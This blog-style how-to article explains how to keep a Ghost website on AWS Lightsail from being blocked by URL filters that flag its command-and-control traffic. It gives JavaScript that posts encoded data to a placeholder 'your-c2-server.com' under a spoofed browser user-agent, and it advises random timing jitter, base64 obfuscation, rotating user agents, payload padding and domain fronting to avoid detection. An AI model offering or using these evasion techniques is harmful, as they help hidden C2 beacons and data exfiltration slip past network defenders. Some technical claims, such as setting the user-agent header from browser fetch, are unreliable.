---
title: "How to prevent URL filtering (C2) from blocking an AWS Lightsail Ghost website?"
date: "2024-12-14"
id: "how-to-prevent-url-filtering-c2-from-blocking-an-aws-lightsail-ghost-website"
---

alright, so you're dealing with url filtering on a ghost website hosted on lightsail, specifically related to command and control (c2) traffic, a classic problem. i've been down this road a few times, and it's never fun. it usually involves a dance of tweaking settings and hoping something sticks. the basic problem is that your outgoing requests are getting flagged, and the filter is shutting it down. we need to make those requests less suspicious.

my first experience with this kind of thing was back in 2016. i was setting up a small web service for a research project and we needed to send some very specific telemetry data to another server. this other server, which we controlled, was basically our c2 node. we kept getting blocked, and i spent a good 3 days figuring it out. i even thought about adding some image processing to just hide the data in pixel colors but that seemed a bit too ridiculous and not scaleable at all. i was pretty green back then, and it was brutal. it wasn't lightsail, but the principles are the same. the filters are looking for patterns. they don't care where your server is, just that it looks like it's doing something bad.

here’s the breakdown on how i usually tackle this:

**1. camouflage your requests:**

the default outgoing requests from a website can be pretty generic. they often use standard http headers and have predictable patterns. we need to make these look less like c2 communication and more like regular web traffic. a very simple starting point is tweaking the user-agent string. instead of using the ghost default, we’re gonna fake it like a normal web browser. it’s a really basic thing, but it's usually the starting point to bypass some less strict filters.

```javascript
// example: node.js (for ghost themes)
const https = require('https');

const options = {
  hostname: 'your-c2-server.com',
  port: 443,
  path: '/your/endpoint',
  method: 'POST',
  headers: {
    'user-agent': 'mozilla/5.0 (windows nt 10.0; win64; x64) applewebkit/537.36 (khtml, like gecko) chrome/91.0.4472.124 safari/537.36',
    'content-type': 'application/json'
  },
};

const req = https.request(options, (res) => {
    //...
});

req.write(JSON.stringify({ /* your data */ }));
req.end();
```
in this node.js snippet, i'm using a fake user-agent string that looks like a modern chrome browser. this won't fool everything, but it's a start. you'll need to adapt this to how your ghost theme handles outgoing requests, which might vary. if you are using javascript directly on the theme (which isn't something you should do on production) you could directly use fetch.
```javascript
fetch('https://your-c2-server.com/your/endpoint', {
    method: 'POST',
    headers: {
        'user-agent': 'mozilla/5.0 (windows nt 10.0; win64; x64) applewebkit/537.36 (khtml, like gecko) chrome/91.0.4472.124 safari/537.36',
        'content-type': 'application/json'
      },
    body: JSON.stringify({ /* your data */ }),
}).then(response => {
    //...
});
```
you should also be using https always, so no http here at all for the request. the content-type should be also modified to match the data type that you are sending.

**2. rate limiting and timing obfuscation:**

another thing that url filters often target are rapid, repetitive connections to the same endpoint. if your ghost site is constantly hammering the c2 server, it's going to look suspicious. the solution? rate limiting and adding some timing variance.
instead of doing requests inmediately you could introduce some delay in every request. in my past experience i actually had a cronjob that sent the data every 1 hour in a randomized minute after the hour. this helped a lot.

```javascript
// example: introducing delay in node.js
function delayedRequest(data){
    const delay = Math.floor(Math.random() * 60000); // random delay between 0 and 60 seconds in milisecs
    setTimeout(() => {
        // perform the http request here from the previous example
        //...
      }, delay);
}
delayedRequest({/*your data*/});
```
using `settimeout` we can introduce a randomized delay before the request is sent. doing this will add some random times to your traffic which will be much less suspicious than constant calls.

**3. data encoding and payloads:**

the data itself can be a red flag. if the payloads are structured in an easily recognizable format like typical c2 commands, you're going to get blocked. instead, you can encode data and make it less obvious. simple base64 encoding can be surprisingly effective, especially when coupled with slight alterations.
base64 is not actually encryption but this will make the traffic much more difficult to easily understand at a quick glance.

```javascript
// example: encoding and sending data in javascript
function sendData(data) {
  const encodedData = btoa(JSON.stringify(data)); // base64 encode
  fetch('https://your-c2-server.com/your/endpoint', {
    method: 'POST',
      headers: {
        'user-agent': 'mozilla/5.0 (windows nt 10.0; win64; x64) applewebkit/537.36 (khtml, like gecko) chrome/91.0.4472.124 safari/537.36',
          'content-type': 'text/plain' // set content type to 'text/plain'
        },
      body: encodedData, // send the encoded data
    }).then(response => {
      //...
    });
}
sendData({/*your data*/});
```
on the server side you'd need to decode this base64 data. do not try to do a reverse engineering attack on base64 using regexes, they do not always work. base64 is tricky and not so simple at all.

**4. domain fronting, a last resort**

domain fronting, while sometimes controversial, can be used when other techniques fail. domain fronting is when you make the requests to a domain that is different from your c2 server domain. so the filter only sees a request for a domain, but your actual traffic is going to your real domain. this technique is very powerful and not that hard to use but should be used as a last resort. i haven't used this much in recent times but in the past this helped me a lot. this was actually the core problem of my 2016 incident, i had the wrong domain on the request, i was an idiot then.

**5. general tips:**

*   **monitor your outgoing traffic:** use lightsail's monitoring tools to see if your requests are even getting out. it's the first step to confirm that the problem is in the filter and not in your code.
*   **test incrementally:** don't change everything at once. modify one thing and test before changing something else. this helps you to find the culprit faster.
*   **check server logs:** make sure that your c2 server is actually receiving requests.
*   **vary the payloads:** do not use the same data all the time, add some random data to it that has no actual meaning.
*   **rotate user agents:** use a pool of common user agents instead of the same one all the time.
*   **look at the filters logs:** sometimes the filters have logs that may give you a hint about why the requests are being blocked. not all filters have this kind of feature.
*   **do not do dumb things:** do not try to do a self-signed certificates for the c2, this is super suspicious. i've tried it, it does not work.

and a small joke: why was the javascript developer always calm? because he knew how to *handle* promises.

**resources:**

for a deep dive into network security and techniques like these, i recommend looking at:
*   "practical packet analysis" by chris sanders: it's an excellent resource for understanding network traffic and how filters work.
*   "applied cryptography" by bruce schneier: this book provides the essential understanding of cryptographic principles and it will give you some ideas on how to encode the data beyond the simple base64 encoding that i have shown.
*   rfc documents related to http, https and user-agent strings are your best source of truth, but usually reading them without a basic understanding is very difficult, so start from the books.

remember, this isn't a foolproof solution. url filters are constantly evolving, so it's a never-ending battle. the key is to make your traffic look as normal as possible and to avoid any patterns that stand out. always test incrementally and watch the logs. good luck, and if you're still hitting roadblocks, feel free to give some specific code examples of what your ghost site is doing, it will be easier for me to help you more.
